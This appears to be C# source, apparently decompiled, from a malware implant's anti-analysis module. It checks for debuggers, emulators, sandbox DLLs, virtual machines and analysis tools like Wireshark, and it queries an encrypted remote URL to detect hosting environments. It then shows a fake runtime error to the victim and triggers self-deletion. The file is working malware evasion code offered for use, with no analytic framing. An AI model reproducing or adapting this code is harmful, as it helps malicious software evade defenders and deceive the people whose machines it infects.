using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Client.Modules.Implant;

internal sealed class AntiAnalysis
{
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static bool Debugger()
	{
		bool isDebuggerPresent = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
			return isDebuggerPresent;
		}
		catch
		{
			return isDebuggerPresent;
		}
	}

	private static bool Emulator()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (DateTime.Now.Ticks - ticks < 10)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool Hosting()
	{
		try
		{
			return new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[48]
			{
				150, 74, 225, 199, 246, 42, 22, 12, 92, 2,
				165, 125, 115, 20, 210, 212, 231, 87, 111, 21,
				89, 98, 65, 247, 202, 71, 238, 24, 143, 201,
				231, 207, 181, 18, 199, 100, 99, 153, 55, 114,
				55, 39, 135, 191, 144, 26, 106, 93
			})).Contains("true");
		}
		catch
		{
		}
		return false;
	}

	private static bool Processes()
	{
		Process[] processes = Process.GetProcesses();
		string[] source = new string[8] { "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain" };
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (source.Contains(process.ProcessName.ToLower()))
			{
				return true;
			}
		}
		return false;
	}

	private static bool SandBox()
	{
		string[] array = new string[5] { "SbieDll.dll", "SxIn.dll", "Sf2.dll", "snxhk.dll", "cmdvrt32.dll" };
		for (int i = 0; i < array.Length; i++)
		{
			if (GetModuleHandle(array[i]).ToInt32() != 0)
			{
				return true;
			}
		}
		return false;
	}

	private static bool VirtualBox()
	{
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
		{
			try
			{
				using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
				foreach (ManagementBaseObject item in managementObjectCollection)
				{
					if ((item["Manufacturer"].ToString().ToLower() == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || item["Manufacturer"].ToString().ToLower().Contains("vmware") || item["Model"].ToString() == "VirtualBox")
					{
						return true;
					}
				}
			}
			catch
			{
				return true;
			}
		}
		foreach (ManagementBaseObject item2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
		{
			if (item2.GetPropertyValue("Name").ToString().Contains("VMware") && item2.GetPropertyValue("Name").ToString().Contains("VBox"))
			{
				return true;
			}
		}
		return false;
	}

	public static void FakeErrorMessage()
	{
		string text = StringsCrypt.GenerateRandomData("1");
		text = "0x" + text.Substring(0, 5);
		MessageBox.Show("Exit code " + text, "Runtime error", MessageBoxButtons.RetryCancel, MessageBoxIcon.Hand);
		SelfDestruct.Melt();
	}
}
